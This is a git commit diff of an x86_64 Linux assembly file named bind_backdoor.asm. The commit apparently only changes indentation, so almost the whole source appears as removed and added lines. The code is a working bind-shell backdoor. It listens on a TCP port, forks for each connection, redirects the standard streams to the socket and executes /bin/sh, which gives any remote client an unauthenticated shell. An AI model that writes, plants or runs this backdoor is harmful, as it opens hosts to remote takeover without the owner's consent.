9a00855ff61451287663d93c5e341abe751bae77
MMxM <mmedeiros450@gmail.com>
2015-08-23 17:55:01 -0300

    bind backdoor (linux/x86_64)

--- bind_backdoor.asm
+++ bind_backdoor.asm
@@ -34,124 +34,124 @@ so_reuseaddr equ 2
 section .data
 
 section .text
-	global _start
+  global _start
 _start:
-	mov rbp, rsp
+  mov rbp, rsp
 
-	;sub rsp, 28 ; int sock_fd, int sock_accept, int setsockopt_option, struct sockaddr_in, char []
+  ;sub rsp, 28 ; int sock_fd, int sock_accept, int setsockopt_option, struct sockaddr_in, char []
 
-	sub rsp, 52
+  sub rsp, 52
 
-	mov rax, 0x0068732f6e69622f ; /bin/sh
-	mov [rbp-36], rax
-	lea rax, [rbp-36]
-	mov [rbp-52], rax
+  mov rax, 0x0068732f6e69622f ; /bin/sh
+  mov [rbp-36], rax
+  lea rax, [rbp-36]
+  mov [rbp-52], rax
 
-	xor rax, rax
-	mov [rbp-44], rax
+  xor rax, rax
+  mov [rbp-44], rax
 
-	mov rax, sys_socket
-	mov rdi, af_inet
-	mov rsi, sock_stream
-	mov rdx, ipproto_tcp
-	call xsyscall
+  mov rax, sys_socket
+  mov rdi, af_inet
+  mov rsi, sock_stream
+  mov rdx, ipproto_tcp
+  call xsyscall
 
-	mov dword [rbp-4], eax ; store sock_fd
-	mov dword [rbp-8], 1
+  mov dword [rbp-4], eax ; store sock_fd
+  mov dword [rbp-8], 1
 
-	mov rax, sys_setsockopt
+  mov rax, sys_setsockopt
   mov rdi, [dword rbp-4] ; sock_fd
   mov rsi, sol_socket
   mov rdx, so_reuseaddr
   lea r10, [rbp-8]
   mov r8, 4 ; sizeof rbp-8
-	call xsyscall
+  call xsyscall
 
-	xor rcx, rcx
+  xor rcx, rcx
   mov word [rbp-24], af_inet ; sin_family
-	mov word [rbp-22], ((listen_port & 0xff) << 8 | (listen_port >> 8)) ; htons(sin_port)
+  mov word [rbp-22], ((listen_port & 0xff) << 8 | (listen_port >> 8)) ; htons(sin_port)
   mov dword [rbp-18], ecx ; sin_addr
   mov qword [rbp-16], rcx ; sin_zero
 
-	mov rax, sys_bind
-	lea rsi, [rbp-24] ; address of struct sockaddr_in
-	mov rdx, 16 ; sizeof struct sockaddr_in
-	; * rdi already have the value of sock_fd
-	call xsyscall
+  mov rax, sys_bind
+  lea rsi, [rbp-24] ; address of struct sockaddr_in
+  mov rdx, 16 ; sizeof struct sockaddr_in
+  ; * rdi already have the value of sock_fd
+  call xsyscall
 
-	mov rax, sys_listen
-	mov rsi, 100
-	call xsyscall
+  mov rax, sys_listen
+  mov rsi, 100
+  call xsyscall
 
 happy_loop:
-	mov rax, sys_accept
-	mov rdi, [dword rbp-4]
-	xor rsi, rsi
-	xor rdx, rdx
-	call xsyscall
+  mov rax, sys_accept
+  mov rdi, [dword rbp-4]
+  xor rsi, rsi
+  xor rdx, rdx
+  call xsyscall
 
-	mov dword [rbp-28], eax
+  mov dword [rbp-28], eax
 
-	mov rax, sys_fork
-	syscall
+  mov rax, sys_fork
+  syscall
 
-	cmp rax, 0
-	je backdoor
+  cmp rax, 0
+  je backdoor
 
-	mov rax, sys_close
-	mov rdi, [dword rbp-28]
-	syscall
+  mov rax, sys_close
+  mov rdi, [dword rbp-28]
+  syscall
 
-	jmp happy_loop
+  jmp happy_loop
 
 backdoor:
-	mov rax, sys_close
-	mov rdi, [dword rbp-4]
-	syscall
+  mov rax, sys_close
+  mov rdi, [dword rbp-4]
+  syscall
 
-	xor rdi, rdi
-	mov rdi, 2
+  xor rdi, rdi
+  mov rdi, 2
 
-	close_e_dup:
-		mov rax, sys_close
-		syscall
+  close_e_dup:
+    mov rax, sys_close
+    syscall
 
-		mov rsi, rdi
+    mov rsi, rdi
 
-		mov rdi, [dword rbp-28]
-		mov rax, sys_dup2
-		syscall
+    mov rdi, [dword rbp-28]
+    mov rax, sys_dup2
+    syscall
 
-		mov rdi, rsi
+    mov rdi, rsi
 
-		dec rdi
+    dec rdi
 
-	cmp rdi, 0
-	jge close_e_dup
+  cmp rdi, 0
+  jge close_e_dup
 
 ; execve("/bin/sh", ["/bin/sh"], [0])
 
-	mov rax, sys_execve
-	mov rdi, [rbp-52]
-	lea rsi, [rbp-52]
-	xor rdx, rdx
-	syscall
+  mov rax, sys_execve
+  mov rdi, [rbp-52]
+  lea rsi, [rbp-52]
+  xor rdx, rdx
+  syscall
 
-	mov rax, sys_close
-	mov rdi, [dword rbp-28]
-	syscall
+  mov rax, sys_close
+  mov rdi, [dword rbp-28]
+  syscall
 
 
-	jmp exit
+  jmp exit
 
 
 xsyscall:
-	syscall
-	cmp eax, 0
-	jl exit
-	ret
+  syscall
+  cmp eax, 0
+  jl exit
+  ret
 
 exit:
-	mov rax, sys_exit
-	xor rdi, rdi
-	syscall
+  mov rax, sys_exit
+  xor rdi, rdi
+  syscall
